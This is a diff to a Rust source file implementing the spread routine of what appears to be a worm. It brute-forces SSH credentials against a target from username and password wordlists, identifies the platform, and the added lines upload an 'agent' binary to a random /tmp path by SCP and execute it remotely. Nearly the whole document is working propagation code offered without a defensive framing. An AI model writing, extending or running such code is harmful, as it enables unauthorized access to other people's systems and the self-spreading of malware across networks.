@@ -1,5 +1,9 @@
 use crate::wordlist;
+use rand::distributions::Alphanumeric;
+use rand::{thread_rng, Rng};
 use ssh2::{Channel, Session};
+use std::fs;
+use std::io::Write;
 use std::{fmt, io::Read, net::TcpStream, path::PathBuf};
 
 #[derive(Debug, Clone, Copy)]
@@ -13,20 +17,26 @@ enum Platform {
 
 impl fmt::Display for Platform {
     fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {
-        write!(f, "{:?}", self)
+        match self {
+            Platform::LinuxX86_64 => write!(f, "linux_x86_64"),
+            Platform::LinuxAarch64 => write!(f, "linux_aarch64"),
+            Platform::MacOsX86_64 => write!(f, "macos_x86_64"),
+            Platform::MacOsAarch64 => write!(f, "macos_aarch64"),
+            Platform::Unknown => write!(f, "unknown"),
+        }
     }
 }
 
 pub fn spread(install_dir: PathBuf, host_port: &str) -> Result<(), crate::Error> {
     let tcp = TcpStream::connect(host_port)?;
-    let mut sess = Session::new()?;
-    sess.set_tcp_stream(tcp);
-    sess.handshake()?;
+    let mut ssh = Session::new()?;
+    ssh.set_tcp_stream(tcp);
+    ssh.handshake()?;
 
     for username in wordlist::USERNAMES {
         for password in wordlist::PASSWORDS {
-            let _ = sess.userauth_password(username, password);
-            if sess.authenticated() {
+            let _ = ssh.userauth_password(username, password);
+            if ssh.authenticated() {
                 println!(
                     "Authenticated! username: ({}), password: ({})",
                     username, password
@@ -36,9 +46,51 @@ pub fn spread(install_dir: PathBuf, host_port: &str) -> Result<(), crate::Error>
         }
     }
 
-    let platform = identify_platform(&sess)?;
-
+    let platform = identify_platform(&ssh)?;
     println!("detected platform: {}", platform);
+
+    let mut agent_for_platform = install_dir.clone();
+    agent_for_platform.push(format!("agent.{}", platform));
+    if !agent_for_platform.exists() {
+        println!("agent.{} not avalable. Aborting.", platform);
+        return Ok(());
+    }
+
+    println!("Uplaoding: {}", agent_for_platform.display());
+
+    let remote_path = upload_agent(&ssh, &agent_for_platform)?;
+    println!("agent uploaded to {}", &remote_path);
+
+    execute_remote_agent(&ssh, &remote_path)?;
+    println!("Agent successfully executed on remote host 🥳");
+
+    Ok(())
+}
+
+fn upload_agent(ssh: &Session, agent_path: &PathBuf) -> Result<String, crate::Error> {
+    let rand_name: String = thread_rng()
+        .sample_iter(&Alphanumeric)
+        .take(32)
+        .map(char::from)
+        .collect();
+
+    let mut remote_path = PathBuf::from("/tmp");
+    remote_path.push(&rand_name);
+
+    let agent_data = fs::read(agent_path)?;
+
+    println!("size: {}", agent_data.len());
+
+    let mut channel = ssh.scp_send(&remote_path, 0o700, agent_data.len() as u64, None)?;
+    channel.write_all(&agent_data)?;
+
+    Ok(remote_path.display().to_string())
+}
+
+fn execute_remote_agent(ssh: &Session, remote_path: &str) -> Result<(), crate::Error> {
+    let mut channel_exec = ssh.channel_session()?;
+    channel_exec.exec(&remote_path)?;
+    let _ = consume_stdio(&mut channel_exec);
 
     Ok(())
 }
